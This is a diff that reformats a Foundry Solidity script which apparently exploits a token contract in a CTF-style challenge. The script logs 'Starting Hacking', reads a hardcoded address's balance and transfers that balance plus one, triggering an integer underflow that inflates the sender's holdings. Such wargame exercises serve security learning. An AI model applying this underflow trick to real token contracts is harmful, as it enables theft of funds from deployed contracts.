@@ -21,16 +21,15 @@ contract TokenScript is Script {
 
         console.log("Starting Hacking");
 
-        uint initial_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
+        uint256 initial_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
 
-        console.log('Initial Balance', initial_balance);
+        console.log("Initial Balance", initial_balance);
 
-        Token(TokenAddress).transfer(TokenAddress, initial_balance+1); 
-        
-        uint final_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
+        Token(TokenAddress).transfer(TokenAddress, initial_balance + 1);
 
-        console.log('Final Balance', final_balance);
+        uint256 final_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
 
+        console.log("Final Balance", final_balance);
 
         vm.stopBroadcast();
     }
